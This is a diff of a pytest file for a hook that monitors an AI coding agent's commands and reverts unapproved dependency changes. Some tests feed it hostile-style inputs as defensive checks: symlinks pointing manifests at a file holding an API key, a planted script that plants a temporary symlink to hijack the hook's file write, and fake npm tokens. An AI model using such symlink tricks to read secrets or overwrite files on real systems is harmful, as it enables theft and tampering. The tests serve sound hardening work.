+        _ = git(session.repo, "merge", "-q", "other", date=None, check=False)
+        assert (session.repo / ".git" / "MERGE_HEAD").exists()
+        session.write(
+            **{
+                "package.json": package_json(
+                    react="^19.0.0", zod="^4.0.0", vue="^3.0.0", svelte="^5.0.0"
+                )
+            }
+        )
+
+    outcome = session.run("git merge other", merge, failed=True)
+    assert "left in place" in outcome.message
+    assert "svelte" in outcome.message
+    assert "svelte" in (session.read("package.json") or "")
+
+
+def test_go_mod_tidy_churn_is_silent(tmp_path: Path) -> None:
+    before = (
+        "module x\n\ngo 1.27\n\nrequire (\n\texample.com/a v1.0.0\n"
+        "\texample.com/b v1.0.0 // indirect\n)\n"
+    )
+    after = (
+        "module x\n\ngo 1.27\n\ntoolchain go1.27.1\n\n"
+        "require example.com/a v1.0.0\n\nrequire (\n"
+        "\texample.com/b v1.1.0 // indirect\n"
+        "\texample.com/c v1.0.0 // indirect\n)\n"
+    )
+    session = Session(tmp_path).init(**{"go.mod": before})
+    outcome = session.run("go mod tidy", lambda: session.write(**{"go.mod": after}))
+    assert outcome == Outcome(None, None)
+
+
+def test_a_direct_go_requirement_is_undone(tmp_path: Path) -> None:
+    before = "module x\n\ngo 1.27\n\nrequire example.com/a v1.0.0\n"
+    after = before + "require example.com/new v1.0.0\n"
+    session = Session(tmp_path).init(**{"go.mod": before, "go.sum": "a\n"})
+    outcome = session.run(
+        "go mod tidy",
+        lambda: session.write(**{"go.mod": after, "go.sum": "a\nnew\n"}),
+    )
+    assert "go.mod adds example.com/new" in outcome.message
+    assert session.read("go.mod") == before
+    assert session.read("go.sum") == "a\n"
+
+
+def test_brewfile_lines(tmp_path: Path) -> None:
+    before = 'brew "jq"\nbrew "gh"\n'
+    session = Session(tmp_path).init(Brewfile=before)
+    reordered = "# tools\nbrew 'gh'\nbrew  \"jq\"\n"
+    assert session.run("sort", lambda: session.write(Brewfile=reordered)) == Outcome(
+        None, None
+    )
+    outcome = session.run(
+        "brew bundle add rg", lambda: session.write(Brewfile=reordered + 'brew "rg"\n')
+    )
+    assert 'Brewfile adds brew "rg"' in outcome.message
+    assert session.read("Brewfile") == reordered
+
+
+def test_yaml_reformatting_is_silent(tmp_path: Path) -> None:
+    before = "repos:\n  - repo: local\n    rev: 'v1'\n"
+    session = Session(tmp_path).init(**{".pre-commit-config.yaml": before})
+    outcome = session.run(
+        "prettier --write .",
+        lambda: session.write(
+            **{".pre-commit-config.yaml": 'repos:\n- repo: local\n  rev: "v1"\n'}
+        ),
+    )
+    assert outcome == Outcome(None, None)
+    outcome = session.run(
+        "pre-commit autoupdate",
+        lambda: session.write(
+            **{".pre-commit-config.yaml": 'repos:\n- repo: local\n  rev: "v2"\n'}
+        ),
+    )
+    assert ".pre-commit-config.yaml changes content" in outcome.message
+
+
+def test_a_manifest_the_parser_chokes_on_does_not_break_every_call(
+    session: Session,
+) -> None:
+    session.write(
+        **{
+            "testdata__go.mod": "module x\n\nreplace => foo\n",
+            "testdata__package.json": "[" * 100_000 + "]" * 100_000,
+        }
+    )
+    assert session.run("echo hi") == Outcome(None, None)
+
+
+def test_moving_a_package_is_silent(session: Session) -> None:
+    session.write(
+        **{
+            "packages__web__package.json": package_json(zod="^4.0.0"),
+            "packages__web__src__index.ts": "export {}\n",
+        }
+    )
+    _ = git(session.repo, "add", "-A")
+    _ = git(session.repo, "commit", "-qm", "web")
+    outcome = session.run(
+        "git mv packages/web apps_web",
+        lambda: git(session.repo, "mv", "packages/web", "apps_web", date=None),
+    )
+    assert outcome == Outcome(None, None)
+    assert session.read("apps_web/package.json") == package_json(zod="^4.0.0")
+
+
+def test_copying_a_package_is_not_silent(session: Session) -> None:
+    session.write(**{"packages__web__package.json": package_json(zod="^4.0.0")})
+    _ = git(session.repo, "add", "-A")
+    _ = git(session.repo, "commit", "-qm", "web")
+    outcome = session.run(
+        "cp -r packages/web packages/api",
+        lambda: session.write(
+            **{"packages__api__package.json": package_json(zod="^4.0.0")}
+        ),
+    )
+    assert "packages/api/package.json adds zod (new file)" in outcome.message
+    assert session.read("packages/api/package.json") is None
+
+
+def test_credentials_in_a_line_manifest_are_not_quoted(tmp_path: Path) -> None:
+    before = "registry=https://registry.npmjs.org/\n"
+    session = Session(tmp_path).init(**{".npmrc": before})
+    outcome = session.run(
+        "npm config set --location=project",
+        lambda: session.write(
+            **{
+                ".npmrc": before
+                + "//registry.npmjs.org/:_authToken=npm_FAKE\n"
+                + "@acme:registry=https://user:hunter2@npm.example.com/\n"
+                + "_auth=aHVudGVyMw==\n"
+            }
+        ),
+    )
+    assert "_authToken=<redacted>" in outcome.message
+    assert "npm_FAKE" not in outcome.message
+    assert "hunter2" not in outcome.message
+    assert "_auth=<redacted>" in outcome.message
+    assert "aHVudGVyMw" not in outcome.message
+    assert session.read(".npmrc") == before
+
+
+def test_an_unparsable_manifest_is_reported(session: Session) -> None:
+    outcome = session.run(
+        "sed -i '' s/,// package.json",
+        lambda: session.write(**{"package.json": '{"name": "app" "dependencies": {}}'}),
+    )
+    assert "could not parse" in outcome.message
+    assert "left in place" in outcome.message
+
+
+def test_an_unstaged_lockfile_is_put_back_in_the_index(session: Session) -> None:
+    def action() -> None:
+        add_zod(session)()
+        _ = git(session.repo, "rm", "-q", "--cached", "bun.lock", date=None)
+        _ = git(session.repo, "add", "package.json", date=None)
+
+    outcome = session.run("bun add zod && git rm --cached bun.lock", action)
+    assert "adds zod" in outcome.message
+    assert "could not reset" not in outcome.message
+    assert git(session.repo, "status", "--porcelain") == ""
+
+
+def test_an_index_that_cannot_be_reset_is_reported(session: Session) -> None:
+    def action() -> None:
+        add_zod(session)()
+        _ = git(session.repo, "add", "package.json", date=None)
+        _ = (session.repo / ".git" / "index.lock").write_text("")
+
+    outcome = session.run("bun add zod && git add package.json", action)
+    assert "could not reset the git index for package.json" in outcome.message
+    assert session.read("package.json") == package_json(react="^19.0.0")
+
+
+def test_a_symlinked_lockfile_is_not_replaced(tmp_path: Path) -> None:
+    session = Session(tmp_path).init(
+        **{"package.json": package_json(), "locks__shared.lock": LOCK}
+    )
+    (session.repo / "bun.lock").symlink_to("locks/shared.lock")
+    _ = git(session.repo, "add", "-A")
+    _ = git(session.repo, "commit", "-qm", "link")
+    outcome = session.run(
+        "bun install zod",
+        lambda: session.write(
+            **{
+                "package.json": package_json(zod="^4.0.0"),
+                "locks__shared.lock": LOCK_WITH_ZOD,
+            }
+        ),
+    )
+    assert "bun.lock is a symbolic link" in outcome.message
+    assert "left in place" in outcome.message
+    assert (session.repo / "bun.lock").is_symlink()
+
+
+def test_an_empty_file_has_no_specs_whatever_its_name(tmp_path: Path) -> None:
+    session = Session(tmp_path).init(
+        **{"bunfig.toml": "", "requirements.txt": "flask==3.0\n"}
+    )
+    outcome = session.run(
+        "pip-compile --remove-all",
+        lambda: session.write(**{"requirements.txt": ""}),
+    )
+    assert outcome == Outcome(None, None)
+
+
+def state_files(state_home: Path) -> list[bytes]:
+    return [path.read_bytes() for path in state_home.rglob("*") if path.is_file()]
+
+
+def test_a_link_to_a_file_outside_the_repository_is_not_read(
+    session: Session, state_home: Path, tmp_path: Path
+) -> None:
+    secret = tmp_path / "secret.txt"
+    _ = secret.write_text("API_KEY=hunter2\n")
+    outcome = session.run(
+        "ln -s ../secret.txt requirements.txt",
+        lambda: (session.repo / "requirements.txt").symlink_to(secret),
+    )
+    assert "could not parse" in outcome.message
+    assert "hunter2" not in outcome.message
+    assert not any(b"hunter2" in data for data in state_files(state_home))
+    _ = session.run(
+        "ln -sf ../secret.txt bun.lock",
+        lambda: [
+            (session.repo / "bun.lock").unlink(),
+            (session.repo / "bun.lock").symlink_to(secret),
+        ],
+    )
+    assert not any(b"hunter2" in data for data in state_files(state_home))
+
+
+def test_a_stash_message_that_is_not_utf8_does_not_break_every_call(
+    session: Session,
+) -> None:
+    session.write(**{"package.json": package_json(react="^19.0.0", zod="^4.0.0")})
+    _ = git(session.repo, "stash", "push", "-q", "-m", os.fsdecode(b"caf\xe9 wip"))
+    assert session.run("echo hi") == Outcome(None, None)
+
+
+def test_a_directory_named_like_pathspec_magic_has_history(session: Session) -> None:
+    _ = git(session.repo, "checkout", "-q", "-b", "upgrade")
+    session.write(**{":app__package.json": package_json(zod="^4.0.0")})
+    _ = git(session.repo, "add", "-A")
+    _ = git(session.repo, "commit", "-qm", "app")
+    _ = git(session.repo, "checkout", "-q", "main")
+    outcome = session.run(
+        "git checkout upgrade",
+        lambda: git(session.repo, "checkout", "-q", "upgrade", date=None),
+    )
+    assert outcome == Outcome(None, None), outcome.message
+
+
+type Record = dict[str, object]
+
+
+def read_state(root_dir: Path) -> Record:
+    return cast("Record", json.loads((root_dir / "state.json").read_text()))
+
+
+def calls_of(state: Record) -> dict[str, Record]:
+    return cast("dict[str, Record]", state["calls"])
+
+
+def test_an_old_undo_does_not_taint_a_pair_for_good(
+    session: Session, state_home: Path
+) -> None:
+    _ = session.run("bun install zod", add_zod(session))
+    (root_dir,) = (state_home / "claude-dependency-guard" / "roots").iterdir()
+    state = read_state(root_dir)
+    taint = cast("list[str]", state["taint"])
+    assert taint
+    state["taint"] = dict.fromkeys(taint, 1.0)
+    state["handled"] = {}
+    _ = (root_dir / "state.json").write_text(json.dumps(state))
+    _ = session.run("echo hi")
+    assert read_state(root_dir)["taint"] == {}
+
+
+def test_a_finished_call_keeps_no_snapshot(session: Session, state_home: Path) -> None:
+    _ = session.run("echo hi")
+    (root_dir,) = (state_home / "claude-dependency-guard" / "roots").iterdir()
+    (call,) = calls_of(read_state(root_dir)).values()
+    assert call["end"] is not None
+    assert call["snapshot"] == {}
+    assert call["index"] == {}
+
+
+def test_a_closed_call_is_kept_while_an_older_call_is_open(
+    session: Session, state_home: Path
+) -> None:
+    dev, _ = session.start("bun run dev")
+    _ = session.finish(
+        dev, "bun run dev", response={"stdout": "", "backgroundTaskId": "dev"}
+    )
+    _ = session.run("echo hi")
+    (root_dir,) = (state_home / "claude-dependency-guard" / "roots").iterdir()
+    state_file = root_dir / "state.json"
+    state = read_state(root_dir)
+    calls = calls_of(state)
+    (closed,) = [cid for cid, call in calls.items() if call["end"]]
+    for call in calls.values():
+        call["pre"] = cast("float", call["pre"]) - 10_800
+        if call["end"]:
+            call["end"] = cast("float", call["end"]) - 7_200
+    _ = state_file.write_text(json.dumps(state))
+    _ = session.run("echo again")
+    assert closed in calls_of(read_state(root_dir))
+    _ = session.event("SessionEnd", reason="other")
+    _ = session.run("echo once more")
+    assert closed not in calls_of(read_state(root_dir))
+
+
+def test_a_stop_without_the_task_list_judges_nothing(session: Session) -> None:
+    call_id, _ = session.start("bun install zod")
+    _ = session.finish(
+        call_id, "bun install zod", response={"stdout": "", "backgroundTaskId": "bg1"}
+    )
+    add_zod(session)()
+    assert session.event("Stop", stop_hook_active=False) is None
+    assert "zod" in (session.read("package.json") or "")
+    stop = session.stop()
+    assert stop is not None
+    assert "adds zod" in cast("str", stop["reason"])
+
+
+def test_a_subagent_stop_ends_the_calls_of_that_agent(session: Session) -> None:
+    _ = session.event(
+        "PreToolUse",
+        tool_name="Bash",
+        tool_input={"command": "sleep 1000"},
+        tool_use_id="toolu_sub",
+        agent_id="agent-x",
+    )
+    _ = session.stop()
+    outcome = session.run("bun install zod", add_zod(session))
+    assert "left in place" in outcome.message
+    session.write(**{"package.json": package_json(react="^19.0.0"), "bun.lock": LOCK})
+    _ = session.event(
+        "SubagentStop", stop_hook_active=False, agent_id="agent-x", background_tasks=[]
+    )
+    outcome = session.run("bun install zod", add_zod(session))
+    assert "adds zod" in outcome.message
+    assert "left in place" not in outcome.message
+
+
+def test_a_symlinked_manifest_is_not_replaced(tmp_path: Path) -> None:
+    session = Session(tmp_path).init(**{"real.json": package_json()})
+    (session.repo / "package.json").symlink_to("real.json")
+    _ = git(session.repo, "add", "package.json")
+    _ = git(session.repo, "commit", "-qm", "link")
+    outcome = session.run(
+        "bun install zod",
+        lambda: session.write(**{"real.json": package_json(zod="^4.0.0")}),
+    )
+    assert "symbolic link" in outcome.message
+    assert (session.repo / "package.json").is_symlink()
+
+
+def test_overlapping_commands_are_reported_not_undone(session: Session) -> None:
+    slow, _ = session.start("bun test")
+    outcome = session.run("bun install zod", add_zod(session))
+    assert "another command ran at the same time" in outcome.message
+    assert "zod" in (session.read("package.json") or "")
+    assert session.finish(slow, "bun test") is None
+
+
+def test_another_sessions_prompted_command_is_not_undone(
+    session: Session, tmp_path: Path
+) -> None:
+    other = Session(tmp_path, "session-2")
+    slow, _ = other.start("bun add zod")
+    _ = other.event(
+        "PermissionRequest", tool_name="Bash", tool_input={"command": "bun add zod"}
+    )
+    quick = session.run("echo hi", add_zod(session))
+    assert "left in place" in quick.message
+    assert other.finish(slow, "bun add zod") is None
+    assert "zod" in (session.read("package.json") or "")
+
+
+def start_edit(session: Session, call_id: str, **fields: object) -> dict[str, object]:
+    edit: dict[str, object] = {
+        "file_path": str(session.repo / "package.json"),
+        "old_string": '"react"',
+        "new_string": '"react"',
+    }
+    _ = session.event(
+        "PreToolUse", tool_name="Edit", tool_input=edit, tool_use_id=call_id, **fields
+    )
+    return edit
+
+
+def test_a_concurrent_edit_is_not_undone(session: Session) -> None:
+    _ = start_edit(session, "toolu_edit", agent_id="subagent")
+    outcome = session.run("bun test", add_zod(session))
+    assert outcome == Outcome(None, None)
+    assert "zod" in (session.read("package.json") or "")
+
+
+def test_a_refused_edit_does_not_excuse_a_later_command(session: Session) -> None:
+    edit = start_edit(session, "toolu_edit")
+    _ = session.batch(("toolu_edit", "Edit", edit))
+    outcome = session.run("bun install zod", add_zod(session))
+    assert "adds zod" in outcome.message
+    assert "zod" not in (session.read("package.json") or "")
+
+
+def test_a_stop_ends_the_edit_of_a_subagent_that_never_ran(session: Session) -> None:
+    _ = start_edit(session, "toolu_edit", agent_id="subagent")
+    _ = session.event(
+        "SubagentStop", stop_hook_active=False, agent_id="subagent", background_tasks=[]
+    )
+    outcome = session.run("bun install zod", add_zod(session))
+    assert "adds zod" in outcome.message
+    assert "zod" not in (session.read("package.json") or "")
+
+
+def test_a_refused_edit_of_the_same_agent_is_not_concurrent(session: Session) -> None:
+    _ = start_edit(session, "toolu_edit")
+    outcome = session.run("bun install zod", add_zod(session))
+    assert "adds zod" in outcome.message
+    assert "zod" not in (session.read("package.json") or "")
+
+
+def test_a_refused_command_does_not_hide_a_later_change(session: Session) -> None:
+    command = {"command": "bun add zod"}
+    call_id, _ = session.start("bun add zod")
+    _ = session.event("PermissionRequest", tool_name="Bash", tool_input=command)
+    _ = session.batch((call_id, "Bash", command))
+    outcome = session.run("bun install zod", add_zod(session))
+    assert "adds zod" in outcome.message
+    assert "left in place" not in outcome.message
+    assert "zod" not in (session.read("package.json") or "")
+    assert "adds zod" in session.run("bun add zod", add_zod(session)).message
+
+
+def test_a_batch_leaves_background_calls_open(session: Session) -> None:
+    command = {"command": "bun install zod"}
+    call_id, _ = session.start("bun install zod")
+    _ = session.finish(
+        call_id, "bun install zod", response={"stdout": "", "backgroundTaskId": "bg1"}
+    )
+    _ = session.batch((call_id, "Bash", command))
+    add_zod(session)()
+    assert session.stop(background=["bg1"]) is None
+    stop = session.stop()
+    assert stop is not None
+    assert "adds zod" in cast("str", stop["reason"])
+
+
+def test_a_finished_session_does_not_hide_changes(
+    session: Session, tmp_path: Path
+) -> None:
+    other = Session(tmp_path, "session-2")
+    call_id, _ = other.start("bun run dev")
+    _ = other.finish(
+        call_id, "bun run dev", response={"stdout": "", "backgroundTaskId": "dev"}
+    )
+    _ = other.event("SessionEnd", reason="other")
+    outcome = session.run("bun install zod", add_zod(session))
+    assert "adds zod" in outcome.message
+    assert "left in place" not in outcome.message
+    assert "zod" not in (session.read("package.json") or "")
+
+
+def test_background_commands_are_judged_when_they_finish(session: Session) -> None:
+    call_id, _ = session.start("bun install zod")
+    post = session.finish(
+        call_id, "bun install zod", response={"stdout": "", "backgroundTaskId": "bg1"}
+    )
+    assert post is None
+    add_zod(session)()
+    assert session.stop(background=["bg1"]) is None
+    assert "zod" in (session.read("package.json") or "")
+    stop = session.stop()
+    assert stop is not None
+    assert stop["decision"] == "block"
+    assert "adds zod" in cast("str", stop["reason"])
+    assert "zod" not in (session.read("package.json") or "")
+    assert session.stop() is None
+
+
+def test_monitor_commands_are_background(session: Session) -> None:
+    call_id, _ = session.start("tail -f log", tool="Monitor")
+    post = session.finish(
+        call_id, "tail -f log", tool="Monitor", response={"taskId": "m1"}
+    )
+    assert post is None
+    add_zod(session)()
+    assert session.stop(background=["m1"]) is None
+    assert "zod" in (session.read("package.json") or "")
+    stop = session.stop()
+    assert stop is not None
+    assert "adds zod" in cast("str", stop["reason"])
+
+
+def test_an_interrupted_undo_is_finished(session: Session, state_home: Path) -> None:
+    outcome = session.run("bun install zod", add_zod(session))
+    assert "adds zod" in outcome.message
+    add_zod(session)()
+    (root_dir,) = (state_home / "claude-dependency-guard" / "roots").iterdir()
+    original = hashlib.sha256(package_json(react="^19.0.0").encode()).hexdigest()
+    _ = (root_dir / "journal.json").write_text(json.dumps([["package.json", original]]))
+    _ = session.run("echo hi")
+    assert session.read("package.json") == package_json(react="^19.0.0")
+    assert not (root_dir / "journal.json").exists()
+
+
+def test_the_main_checkout_is_not_judged_for_a_command_in_a_worktree(
+    session: Session, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    (tmp_path / "worktree").mkdir()
+    worktree = Session(tmp_path / "worktree", "session-w")
+    _ = git(session.repo, "worktree", "add", "-q", str(worktree.repo), "-b", "w")
+    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(session.repo))
+    outcome = worktree.run(
+        "bun test",
+        lambda: session.write(
+            **{"package.json": package_json(react="^19.0.0", zod="^4.0.0")}
+        ),
+    )
+    assert outcome == Outcome(None, None)
+    assert "zod" in (session.read("package.json") or "")
+
+
+def test_saved_files_are_pruned_after_a_month(
+    session: Session, state_home: Path
+) -> None:
+    _ = session.run("bun install zod", add_zod(session))
+    (root_dir,) = (state_home / "claude-dependency-guard" / "roots").iterdir()
+    (saved,) = (root_dir / "reverted").iterdir()
+    os.utime(saved, (1.0, 1.0))
+    _ = session.run("echo hi")
+    assert not saved.exists()
+
+
+def test_a_removed_repository_is_skipped(session: Session) -> None:
+    call_id, _ = session.start("git worktree remove .")
+    shutil.rmtree(session.repo)
+    assert session.finish(call_id, "git worktree remove .") is None
+
+
+def test_state_from_other_code_is_discarded(session: Session, state_home: Path) -> None:
+    _ = session.run("echo hi")
+    (root_dir,) = (state_home / "claude-dependency-guard" / "roots").iterdir()
+    state = read_state(root_dir)
+    state["version"] = 0
+    state["taint"] = {'["package.json", "dependencies:zod", "^4.0.0"]': 1.0}
+    _ = (root_dir / "state.json").write_text(json.dumps(state))
+    _ = session.run("echo hi")
+    state = read_state(root_dir)
+    assert state["version"] == 1
+    assert state["taint"] == {}
+
+
+def test_files_that_are_gone_leave_the_stat_cache(
+    session: Session, state_home: Path
+) -> None:
+    session.write(**{"extra__package.json": package_json()})
+    _ = session.run("echo hi")
+    (session.repo / "extra" / "package.json").unlink()
+    _ = session.run("echo hi")
+    (root_dir,) = (state_home / "claude-dependency-guard" / "roots").iterdir()
+    stat_cache = cast("dict[str, object]", read_state(root_dir)["stat"])
+    assert "extra/package.json" not in stat_cache
+    assert "package.json" in stat_cache
+
+
+def test_a_corrupt_state_file_asks(session: Session, state_home: Path) -> None:
+    _ = session.run("echo hi")
+    (root_dir,) = (state_home / "claude-dependency-guard" / "roots").iterdir()
+    _ = (root_dir / "state.json").write_text("{")
+    outcome = session.run("echo hi")
+    assert outcome.asked
+    assert outcome.pre is not None
+    reason = cast("dict[str, str]", outcome.pre["hookSpecificOutput"])
+    assert str(root_dir / "state.json") in reason["permissionDecisionReason"]
+
+
+PLANTED_SCRIPT = """\
+import importlib.util
+import os
+import sys
+from pathlib import Path
+
+spec = importlib.util.spec_from_file_location("guard", sys.argv[1])
+guard = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(guard)
+target = Path(sys.argv[2]) / "package.json"
+Path(f"{target.parent}/.package.json.{os.getpid()}.tmp").symlink_to(sys.argv[3])
+guard._write_atomic(target, b"restored")
+"""
+
+
+def test_a_planted_temporary_link_is_not_written_through(tmp_path: Path) -> None:
+    victim = tmp_path / "victim"
+    _ = victim.write_text("keep")
+    result = subprocess.run(
+        [sys.executable, "-c", PLANTED_SCRIPT, str(HOOK), str(tmp_path), str(victim)],
+        capture_output=True,
+        text=True,
+        check=False,
+        timeout=60,
+    )
+    assert result.returncode == 0, result.stderr
+    assert victim.read_text() == "keep"
+    assert (tmp_path / "package.json").read_text() == "restored"
 
 
 WATCHDOG_SCRIPT = """\
@@ -1671,7 +1524,7 @@ def spin(payload):
         pass
 
 
-guard._reason = spin
+guard._handle = spin
 guard.main()
 """
 
@@ -1679,7 +1532,13 @@ guard.main()
 def test_hook_asks_when_it_runs_out_of_time() -> None:
     result = subprocess.run(
         [sys.executable, "-c", WATCHDOG_SCRIPT, str(HOOK)],
-        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": "true"}}),
+        input=json.dumps(
+            {
+                "hook_event_name": "PreToolUse",
+                "tool_name": "Bash",
+                "tool_input": {"command": "true"},
+            }
+        ),
         capture_output=True,
         text=True,
         check=False,
